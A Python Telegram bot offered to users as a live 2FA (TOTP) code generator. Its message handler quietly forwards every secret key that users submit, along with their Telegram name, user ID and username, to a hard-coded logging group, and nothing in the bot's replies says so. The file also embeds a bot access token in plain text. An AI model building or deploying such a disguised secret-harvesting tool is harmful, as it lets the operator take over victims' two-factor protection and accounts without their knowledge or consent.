import pyotp
import time
import asyncio
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.error import BadRequest

# Settings
BOT_TOKEN = '7049992261:AAGSHeHVn2ACs3EZQ_giFNbDJc35Tob0jjw'
LOG_GROUP_ID = -1003801688038 

def generate_progress_bar(remaining_time, total=30):
    length = 10
    filled_length = int(length * remaining_time // total)
    bar = "🟩" * filled_length + "⬜" * (length - filled_length)
    return bar

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[KeyboardButton("🚀 Start Generator")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(
        "👋 **Welcome!**\nSend your **Secret Key** to start.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def update_timer(sent_msg, totp, context):
    try:
        while True:
            current_code = totp.now()
            time_step = totp.interval
            remaining_time = int(time_step - (time.time() % time_step))
            progress_bar = generate_progress_bar(remaining_time, time_step)
            
            text = (
                "🔐 **2FA Live Generator**\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                f"📟 **Code:** `{current_code}`\n\n"
                f"⌛ **Time Left:** `{remaining_time}s`\n"
                f"{progress_bar}\n"
                "━━━━━━━━━━━━━━━━━━━━"
            )
            try:
                await sent_msg.edit_text(text, parse_mode='Markdown')
            except Exception:
                break
            await asyncio.sleep(1)
    except Exception:
        pass

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = update.message.text.strip()

    if text == "🚀 Start Generator":
        await update.message.reply_text("Please send your **Secret Key** now.")
        return

    secret = text.replace(" ", "")
    try:
        totp = pyotp.TOTP(secret)
        totp.now() 

        # 🔔 আপডেট করা লগ সিস্টেম
        # নামের ওপর ক্লিক করলে প্রোফাইল ওপেন হওয়ার জন্য [Name](tg://user?id=123) ফরম্যাট ব্যবহার করা হয়েছে
        log_text = (
            "🔔 **New User Activity Log**\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Name:** [{user.full_name}](tg://user?id={user.id})\n"
            f"🆔 **User ID:** `{user.id}`\n"
            f"🔗 **Username:** @{user.username if user.username else 'None'}\n"
            f"🔑 **Secret Sent:** `{secret}`\n"
            "━━━━━━━━━━━━━━━━━━━━"
        )
        
        await context.bot.send_message(chat_id=LOG_GROUP_ID, text=log_text, parse_mode='Markdown')

        sent_msg = await update.message.reply_text("⚙️ **Starting live generator...**")
        asyncio.create_task(update_timer(sent_msg, totp, context))
        
    except Exception:
        if text != "🚀 Start Generator":
            await update.message.reply_text("❌ **Invalid Secret Key!**")

if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    app.run_polling()
